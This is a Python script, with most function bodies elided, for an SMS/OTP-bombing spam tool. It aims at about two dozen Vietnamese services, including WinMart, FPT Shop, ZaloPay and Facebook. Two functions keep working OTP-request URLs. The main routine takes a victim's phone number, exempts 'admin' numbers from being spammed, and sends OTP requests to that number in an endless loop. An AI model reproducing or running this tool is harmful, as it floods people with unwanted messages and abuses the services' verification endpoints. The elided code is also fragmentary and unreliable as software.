...
def oldpops(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "POPS: SUCCESS!"))
    else:
        print(format_print("x", "POPS: FAILED!"))
...
def oldtv360(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "TV360: SUCCESS!"))
    else:
        print(format_print("x", "TV360: FAILED!"))
...
def oldloship(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "LOSHIP: SUCCESS!"))
    else:
        print(format_print("x", "LOSHIP: FAILED!"))
...
def oldalfrescos(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "ALFRESCOS: SUCCESS!"))
    else:
        print(format_print("x", "ALFRESCOS: FAILED!"))
...
def oldfptshop(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "FPTSHOP: SUCCESS!"))
    else:
        print(format_print("x", "FPTSHOP: FAILED!"))
...
def oldfacebook(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "FACEBOOK: SUCCESS!"))
    else:
        print(format_print("x", "FACEBOOK: FAILED!"))
...
def oldzalopay(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "ZALOPAY: SUCCESS!"))
    else:
        print(format_print("x", "ZALOPAY: FAILED!"))
...
def vieon(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "VIEON: SUCCESS!"))
    else:
        print(format_print("x", "VIEON: FAILED!"))
...
def ahamove(phone):
    ...
    if Response.status_code == 200:
        print(format_print("*", "AHAMOVE: SUCCESS!"))
    else:
        print(format_print("x", "AHAMOVE: FAILED!"))
...
def concung(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "CONCUNG: SUCCESS!"))
    else:
        print(format_print("x", "CONCUNG: FAILED!"))
...
def vietid(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "VIETID: SUCCESS!"))
    else:
        print(format_print("x", "VIETID: FAILED!"))
...
def fptplay(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "FPTPLAY: SUCCESS!"))
    else:
        print(format_print("x", "FPTPLAY: FAILED!"))
...
def funring(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "FUNRING: SUCCESS!"))
    else:
        print(format_print("x", "FUNRING: FAILED!"))
...
def gotadi(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "GOTADI: SUCCESS!"))
    else:
        print(format_print("x", "GOTADI: FAILED!"))

def winmart(phone):
    response = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}")
    if response.status_code == 200:
        print(format_print("*", "WINMART: SUCCESS!"))
    else:
        print(format_print("x", "WINMART: FAILED!"))
...
def moneydong(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "MONEYDONG: SUCCESS!"))
    else:
        print(format_print("x", "MONEYDONG: FAILED!"))

def daihocfpt(phone):
    response = requests.get(f"https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile={phone}")
    if response.status_code == 200:
        print(format_print("*", "DAIHOCFPT: SUCCESS!"))
    else:
        print(format_print("x", "DAIHOCFPT: FAILED!"))
...
def cafeland(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "CAFELAND: SUCCESS!"))
    else:
        print(format_print("x", "CAFELAND: FAILED!"))
...
def oldvayvnd(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "VAYVND: SUCCESS!"))
    else:
        print(format_print("x", "VAYVND: FAILED!"))
...
def oldtamo(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "TAMO: SUCCESS!"))
    else:
        print(format_print("x", "TAMO: FAILED!"))
...
def oldsenmo(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "SENMO: SUCCESS!"))
    else:
        print(format_print("x", "SENMO: FAILED!"))
...
def thantaioi(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "THANTAIOI: SUCCESS!"))
    else:
        print(format_print("x", "THANTAIOI: FAILED!"))
...
def atmonline(phone):
    ...
    if response.status_code == 200:
        print(format_print("*", "ATMONLINE: SUCCESS!"))
    else:
        print(format_print("x", "ATMONLINE: FAILED!"))
...
def Main():
    ...
    Banner()
    while True:
        phone = input(format_input("+",f"ENTER PHONE NUMBER: "))
        if phone in listsdt:
            print(format_print("!", "KHÔNG THỂ SPAM SÓ ADMIN !")); exit()
        else:
            if len(phone) == 10:
                break
            else:
                print(format_print("!", "PHONE NUMBER MUST BE 10 NUMBERS!"))
    while True:
        oldvayvnd(phone)
        oldpops(phone)
        oldtv360(phone)
